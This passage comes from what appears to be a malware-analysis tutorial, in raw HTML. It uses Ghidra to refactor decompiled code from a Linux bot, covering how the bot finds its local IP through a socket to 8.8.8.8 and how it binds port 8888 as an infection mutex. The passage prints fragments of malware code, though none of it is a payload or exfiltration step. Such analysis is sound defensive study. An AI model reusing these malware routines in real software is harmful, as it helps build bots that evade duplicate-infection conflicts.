<span class="kw3">sprintf</span><span class="br0">&#40;</span>myinfo.<span class="me1">local_address</span><span class="sy0">,</span><span class="st0">&quot;%d.%d.%d.%d&quot;</span><span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>byte<span class="br0">&#41;</span>socket_input.<span class="me1">sin_addr</span><span class="sy0">,</span>
            <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>byte<span class="br0">&#41;</span><span class="br0">&#40;</span>socket_input.<span class="me1">sin_addr</span> <span class="sy0">&gt;&gt;</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>socket_input.<span class="me1">sin_addr</span> <span class="sy0">&gt;&gt;</span> <span class="nu12">0x10</span> <span class="sy0">&amp;</span> <span class="nu12">0xff</span><span class="br0">&#41;</span><span class="sy0">,</span>
            <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>socket_input.<span class="me1">sin_addr</span> <span class="sy0">&gt;&gt;</span> <span class="nu12">0x18</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<h3>local_addr summary</h3>
<p>To summarise, the socket is created. Upon failure to do so, this function will return <em>-1</em>. If the socket creation succeeds, a DNS request is made to Google&#8217;s DNS server 8.8.8.8 at port 53. The return value will contain the local address, which is then stored in the <em>myinfo</em> struct. Additionally, the function will return the local IP address.</p>
<p>The complete refactored function is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">ulong local_addr<span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  <span class="kw4">int</span> __fd<span class="sy0">;</span>
  <span class="kw4">uint32_t</span> output<span class="sy0">;</span>
  socklen_t socketLength<span class="sy0">;</span>
  sockaddr_in socket_input<span class="sy0">;</span>
  <span class="kw4">int</span> local_c<span class="sy0">;</span>
&nbsp;
  socketLength <span class="sy0">=</span> <span class="nu12">0x10</span><span class="sy0">;</span>
  __fd <span class="sy0">=</span> socket<span class="br0">&#40;</span>AF_INET<span class="sy0">,</span>SOCK_DGRAM<span class="sy0">,</span>DEFAULT_PROTOCOL<span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>__fd <span class="sy0">==</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    output <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  <span class="kw1">else</span> <span class="br0">&#123;</span>
    socket_input.<span class="me1">sin_family</span> <span class="sy0">=</span> AF_INET<span class="sy0">;</span>
    socket_input.<span class="me1">sin_addr</span> <span class="sy0">=</span> htonl<span class="br0">&#40;</span><span class="nu12">0x8080808</span><span class="br0">&#41;</span><span class="sy0">;</span>
    socket_input.<span class="me1">sin_port</span> <span class="sy0">=</span> htons<span class="br0">&#40;</span><span class="nu12">0x35</span><span class="br0">&#41;</span><span class="sy0">;</span>
    connect<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>socket_input<span class="sy0">,</span><span class="nu12">0x10</span><span class="br0">&#41;</span><span class="sy0">;</span>
    getsockname<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>socket_input<span class="sy0">,&amp;</span>socketLength<span class="br0">&#41;</span><span class="sy0">;</span>
    close<span class="br0">&#40;</span>__fd<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw3">sprintf</span><span class="br0">&#40;</span>myinfo.<span class="me1">local_address</span><span class="sy0">,</span><span class="st0">&quot;%d.%d.%d.%d&quot;</span><span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>byte<span class="br0">&#41;</span>socket_input.<span class="me1">sin_addr</span><span class="sy0">,</span>
            <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>byte<span class="br0">&#41;</span><span class="br0">&#40;</span>socket_input.<span class="me1">sin_addr</span> <span class="sy0">&gt;&gt;</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>socket_input.<span class="me1">sin_addr</span> <span class="sy0">&gt;&gt;</span> <span class="nu12">0x10</span> <span class="sy0">&amp;</span> <span class="nu12">0xff</span><span class="br0">&#41;</span><span class="sy0">,</span>
            <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>socket_input.<span class="me1">sin_addr</span> <span class="sy0">&gt;&gt;</span> <span class="nu12">0x18</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    output <span class="sy0">=</span> socket_input.<span class="me1">sin_addr</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  <span class="kw1">return</span> <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>output<span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p><a name ="the-socket-mutex"></a></p>
<h2><a href="#the-socket-mutex">The socket mutex</a></h2>
<p>A <a href="https://en.cppreference.com/w/cpp/thread/mutex">mutex</a> is used rather often in malware. It is generally used to check if the system is already infected. To avoid interfering with itself, the newest instance of the malware will then shut itself off. A mutex can be the system&#8217;s mutex, but it can also be a file or a registry key. In this case, a different type of mutex is used.</p>
<h3>Analysing ensure_bind</h3>
<p>The first step is to commit the local variables, in order for Ghidra to optimise the decompiled code. </p>
<p>When taking a quick glance at the decompiled output, a similar case compared to the previous function can be seen. The variable <em>local_28</em> is of the <em>sa_family_t</em> type, but is used as the <em>sockaddr</em> in the <a href="https://linux.die.net/man/2/bind">bind</a> function. </p>
<p>Changing the type from <em>sa_family_t</em> to <em>socketaddr_in</em> provides the correct decompiled pseudo code. Also note the fact that <em>ensure_bind</em> does not take any arguments, whilst the code in the <em>main</em> function does provide an argument: the return value of the <em>local_addr</em> function. When the correct type is applied, the function argument becomes visible and usable. The difference is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="co1">//Before</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>__fd <span class="sy0">!=</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    local_28 <span class="sy0">=</span> <span class="nu0">2</span><span class="sy0">;</span>
    htons<span class="br0">&#40;</span><span class="nu12">0x22b8</span><span class="br0">&#41;</span><span class="sy0">;</span>
    uVar1 <span class="sy0">=</span> fcntl<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="nu0">3</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp;
<span class="co1">//After</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>__fd <span class="sy0">!=</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    local_28.<span class="me1">sin_family</span> <span class="sy0">=</span> <span class="nu0">2</span><span class="sy0">;</span>
    local_28.<span class="me1">sin_port</span> <span class="sy0">=</span> htons<span class="br0">&#40;</span><span class="nu12">0x22b8</span><span class="br0">&#41;</span><span class="sy0">;</span>
    local_28.<span class="me1">sin_addr</span> <span class="sy0">=</span> iParm1<span class="sy0">;</span>
    uVar1 <span class="sy0">=</span> fcntl<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="nu0">3</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The variable <em>local_28</em> can be renamed into <em>socketAddr</em>. The complete code of the <em>ensure_bind</em> function is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">void</span> ensure_bind<span class="br0">&#40;</span>in_addr_t iParm1<span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  <span class="kw4">int</span> __fd<span class="sy0">;</span>
  uint uVar1<span class="sy0">;</span>
  <span class="kw4">int</span> iVar1<span class="sy0">;</span>
  <span class="kw4">uint32_t</span> uVar2<span class="sy0">;</span>
  <span class="kw4">int</span> <span class="sy0">*</span>piVar3<span class="sy0">;</span>
  <span class="kw4">int</span> <span class="sy0">*</span>piVar2<span class="sy0">;</span>
  sockaddr_in socketAddr<span class="sy0">;</span>
  <span class="kw4">int</span> local_10<span class="sy0">;</span>
  <span class="kw4">int</span> local_c<span class="sy0">;</span>
&nbsp;
  __fd <span class="sy0">=</span> <span class="nu12">0xffffffff</span><span class="sy0">;</span>
  __fd <span class="sy0">=</span> socket<span class="br0">&#40;</span><span class="nu0">2</span><span class="sy0">,</span><span class="nu0">1</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>__fd <span class="sy0">!=</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    socketAddr.<span class="me1">sin_family</span> <span class="sy0">=</span> <span class="nu0">2</span><span class="sy0">;</span>
    socketAddr.<span class="me1">sin_port</span> <span class="sy0">=</span> htons<span class="br0">&#40;</span><span class="nu12">0x22b8</span><span class="br0">&#41;</span><span class="sy0">;</span>
    socketAddr.<span class="me1">sin_addr</span> <span class="sy0">=</span> iParm1<span class="sy0">;</span>
    uVar1 <span class="sy0">=</span> fcntl<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="nu0">3</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
    fcntl<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="nu0">4</span><span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>uVar1 <span class="sy0">&amp;</span> <span class="nu12">0xffff0000</span> <span class="sy0">|</span> <span class="br0">&#40;</span>uint<span class="br0">&#41;</span>CONCAT11<span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar1 <span class="sy0">&gt;&gt;</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span>uVar1<span class="br0">&#41;</span><span class="br0">&#41;</span>
                 <span class="sy0">|</span> <span class="nu12">0x800</span><span class="br0">&#41;</span><span class="sy0">;</span>
    piVar3 <span class="sy0">=</span> __GI___errno_location<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="sy0">*</span>piVar3 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
    iVar1 <span class="sy0">=</span> bind<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>socketAddr<span class="sy0">,</span><span class="nu12">0x10</span><span class="br0">&#41;</span><span class="sy0">;</span>
    piVar2 <span class="sy0">=</span> __GI___errno_location<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span><span class="br0">&#40;</span>iVar1 <span class="sy0">==</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="sy0">&amp;&amp;</span> <span class="br0">&#40;</span><span class="sy0">*</span>piVar2 <span class="sy0">==</span> <span class="nu0">99</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      close<span class="br0">&#40;</span>__fd<span class="br0">&#41;</span><span class="sy0">;</span>
      sleep<span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
      uVar2 <span class="sy0">=</span> htonl<span class="br0">&#40;</span><span class="nu12">0x7f000001</span><span class="br0">&#41;</span><span class="sy0">;</span>
      ensure_bind<span class="br0">&#40;</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar2<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    <span class="kw1">else</span> <span class="br0">&#123;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>iVar1 <span class="sy0">==</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw3">exit</span><span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
      listen<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
  <span class="br0">&#125;</span>
  <span class="kw1">return</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>At first, an <em>AF_INET</em> socket is created, of the <em>SOCK_STREAM</em> type, together with the default protocol. The change is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="co1">//Before</span>
__fd <span class="sy0">=</span> socket<span class="br0">&#40;</span><span class="nu0">2</span><span class="sy0">,</span><span class="nu0">1</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp;
<span class="sy0">/</span>After
__fd <span class="sy0">=</span> socket<span class="br0">&#40;</span>AF_INET<span class="sy0">,</span>SOCK_STREAM<span class="sy0">,</span>DEFAULT_PROTOCOL<span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>If the creation of the socket does not fail, a <em>sockaddr_in</em> struct is created. The family equals <em>AF_INET</em>, which is represented by the value <em>2</em>. The port is equal to <em>0x22b8</em> (or <em>8888</em> in decimal). The address is taken from the function&#8217;s argument, which is named <em>iParm1</em>. Since the value of <em>iParm1</em> is equal to the return value of <em>local_addr</em>, this value is equal to the IP address of the machine. This variable can be renamed to <em>inputAddress</em>.</p>
<p>The next part of the body of the if-statement calls <a href="https://linux.die.net/man/3/fcntl">fcntl</a> (which stands for <em>File CoNTroL</em>) twice. This function requires a file descriptor as input, together with a command and a value.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">uVar1 <span class="sy0">=</span> fcntl<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="nu0">3</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
fcntl<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="nu0">4</span><span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>uVar1 <span class="sy0">&amp;</span> <span class="nu12">0xffff0000</span> <span class="sy0">|</span> <span class="br0">&#40;</span>uint<span class="br0">&#41;</span>CONCAT11<span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar1 <span class="sy0">&gt;&gt;</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span>uVar1<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">|</span> <span class="nu12">0x800</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>Per <a href="https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/fcntl.h">Linux&#8217; source code</a>, the commands <em>3</em> and <em>4</em> are equal to <em>F_GETFL</em> and <em>F_SETFL</em> respectively. These commands, in order, get and set the file, based on the given file descriptor. These can be changed within Ghidra as such. The refactored code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">uVar1 <span class="sy0">=</span> fcntl<span class="br0">&#40;</span>__fd<span class="sy0">,</span>F_GETFL<span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
fcntl<span class="br0">&#40;</span>__fd<span class="sy0">,</span>F_SETFL<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>uVar1 <span class="sy0">&amp;</span> <span class="nu12">0xffff0000</span> <span class="sy0">|</span> <span class="br0">&#40;</span>uint<span class="br0">&#41;</span>CONCAT11<span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar1 <span class="sy0">&gt;&gt;</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span>uVar1<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">|</span> <span class="nu12">0x800</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The next part of the code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">piVar3 <span class="sy0">=</span> __GI___errno_location<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="sy0">*</span>piVar3 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
iVar1 <span class="sy0">=</span> bind<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>socketAddr<span class="sy0">,</span><span class="nu12">0x10</span><span class="br0">&#41;</span><span class="sy0">;</span>
piVar2 <span class="sy0">=</span> __GI___errno_location<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="br0">&#40;</span>iVar1 <span class="sy0">==</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="sy0">&amp;&amp;</span> <span class="br0">&#40;</span><span class="sy0">*</span>piVar2 <span class="sy0">==</span> <span class="nu0">99</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span></pre></div></div></div></div></div></div></div>


<p>The outcome of the first <em>__GI___errno_location</em> call is set to <em>0</em> directly afterwards. As such, the <em>piVar3</em> variable can be ignored within this function.</p>
<p>After that, the <a href="https://linux.die.net/man/2/bind">bind</a> function is called to bind the newly created <em>sockaddr_in</em> onto the given socket. The return value is stored in <em>iVar1</em>. The <em>iVar1</em> variable can be renamed to <em>bindResult</em>. Additionally, the last error code is obtained and stored in <em>piVar2</em>. The <em>piVar2</em> can be renamed to <em>lastErrorCode</em>. The refactored code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">piVar3 <span class="sy0">=</span> __GI___errno_location<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="sy0">*</span>piVar3 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
bindResult <span class="sy0">=</span> bind<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>socketAddr<span class="sy0">,</span><span class="nu12">0x10</span><span class="br0">&#41;</span><span class="sy0">;</span>
lastErrorCode <span class="sy0">=</span> __GI___errno_location<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="br0">&#40;</span>bindResult <span class="sy0">==</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="sy0">&amp;&amp;</span> <span class="br0">&#40;</span><span class="sy0">*</span>lastErrorCode <span class="sy0">==</span> <span class="nu0">99</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span></pre></div></div></div></div></div></div></div>


<p>The if-statement above checks if the <em>bindResult</em> is equal to <em>-1</em> and if the last error code is equal to <em>99</em>. The enum value that corresponds with <em>99</em> is present in the <a href="https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/errno.h">Linux source code</a>: <em>EADDRNOTAVAIL</em>. Using the Equate functionality within Ghidra, one can replace <em>99</em> with <em>EADDRNOTAVAIL</em>. This value is returned when the address is not available, which would happen when it is already in use. The code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw1">if</span> <span class="br0">&#40;</span><span class="br0">&#40;</span>bindResult <span class="sy0">==</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="sy0">&amp;&amp;</span> <span class="br0">&#40;</span><span class="sy0">*</span>lastErrorCode <span class="sy0">==</span> EADDRNOTAVAIL<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  close<span class="br0">&#40;</span>__fd<span class="br0">&#41;</span><span class="sy0">;</span>
  sleep<span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  uVar2 <span class="sy0">=</span> htonl<span class="br0">&#40;</span><span class="nu12">0x7f000001</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="co1">//127.0.0.1</span>
  ensure_bind<span class="br0">&#40;</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar2<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>If this is the case, the socket is closed, a one second sleep is induced, and the address <em>127.0.0.1</em> is stored in <em>uVar2</em>. The <em>uVar2</em> variable can be renamed into <em>localhost</em>. The <em>iVar1</em> variable can be renamed into <em>bindResult</em>. The <em>ensure_bind</em> function is then called again, this time with <em>127.0.0.1</em> as its parameter. Effectively, port <em>8888</em> on the machine is used, be it via the previously obtained local address or via the local host.</p>
<p>The next part of the code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw1">if</span> <span class="br0">&#40;</span>bindResult <span class="sy0">==</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span> <span class="co1">//</span>
  <span class="kw3">exit</span><span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
listen<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>If the socket cannot be created but the error code does not equal <em>99</em>, the program exits. If the socket can be created, the <a href="http://man7.org/linux/man-pages/man2/listen.2.html">listen</a> function is called. The first argument is the file descriptor. The second argument is the size of the <em>backlog</em>, which is the amount of incoming connections that are put on hold for the given socket. If the given number is exceeded, <em>ECONNREFUSED</em> (or <em>111</em> in decimal) is returned.</p>
<p>This binding serves as some sort of mutex: if the bot is already active, the binding is complete and a new instance will then shut itself down. If it is the first instance, it creates the required bindings and continues with the execution.</p>
<p>The complete refactored code of the function is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">void</span> ensure_bind<span class="br0">&#40;</span>in_addr_t inputAddress<span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  <span class="kw4">int</span> __fd<span class="sy0">;</span>
  uint uVar1<span class="sy0">;</span>
  <span class="kw4">int</span> bindResult<span class="sy0">;</span>
  <span class="kw4">uint32_t</span> localhost<span class="sy0">;</span>
  <span class="kw4">int</span> <span class="sy0">*</span>piVar3<span class="sy0">;</span>
  <span class="kw4">int</span> <span class="sy0">*</span>lastErrorCode<span class="sy0">;</span>
  sockaddr_in socketAddr<span class="sy0">;</span>
  <span class="kw4">int</span> local_10<span class="sy0">;</span>
  <span class="kw4">int</span> local_c<span class="sy0">;</span>
&nbsp;
  __fd <span class="sy0">=</span> <span class="nu12">0xffffffff</span><span class="sy0">;</span>
  __fd <span class="sy0">=</span> socket<span class="br0">&#40;</span>AF_INET<span class="sy0">,</span>SOCK_STREAM<span class="sy0">,</span>DEFAULT_PROTOCOL<span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>__fd <span class="sy0">!=</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    socketAddr.<span class="me1">sin_family</span> <span class="sy0">=</span> <span class="nu0">2</span><span class="sy0">;</span>
    socketAddr.<span class="me1">sin_port</span> <span class="sy0">=</span> htons<span class="br0">&#40;</span><span class="nu12">0x22b8</span><span class="br0">&#41;</span><span class="sy0">;</span>
    socketAddr.<span class="me1">sin_addr</span> <span class="sy0">=</span> inputAddress<span class="sy0">;</span>
    uVar1 <span class="sy0">=</span> fcntl<span class="br0">&#40;</span>__fd<span class="sy0">,</span>F_GETFL<span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
    fcntl<span class="br0">&#40;</span>__fd<span class="sy0">,</span>F_SETFL<span class="sy0">,</span>
          <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>uVar1 <span class="sy0">&amp;</span> <span class="nu12">0xffff0000</span> <span class="sy0">|</span> <span class="br0">&#40;</span>uint<span class="br0">&#41;</span>CONCAT11<span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar1 <span class="sy0">&gt;&gt;</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span>uVar1<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">|</span>
          <span class="nu12">0x800</span><span class="br0">&#41;</span><span class="sy0">;</span>
    piVar3 <span class="sy0">=</span> __GI___errno_location<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="sy0">*</span>piVar3 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
    bindResult <span class="sy0">=</span> bind<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>socketAddr<span class="sy0">,</span><span class="nu12">0x10</span><span class="br0">&#41;</span><span class="sy0">;</span>
    lastErrorCode <span class="sy0">=</span> __GI___errno_location<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span><span class="br0">&#40;</span>bindResult <span class="sy0">==</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="sy0">&amp;&amp;</span> <span class="br0">&#40;</span><span class="sy0">*</span>lastErrorCode <span class="sy0">==</span> EADDRNOTAVAIL<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      close<span class="br0">&#40;</span>__fd<span class="br0">&#41;</span><span class="sy0">;</span>
      sleep<span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
      localhost <span class="sy0">=</span> htonl<span class="br0">&#40;</span><span class="nu12">0x7f000001</span><span class="br0">&#41;</span><span class="sy0">;</span>
      ensure_bind<span class="br0">&#40;</span>localhost<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    <span class="kw1">else</span> <span class="br0">&#123;</span>
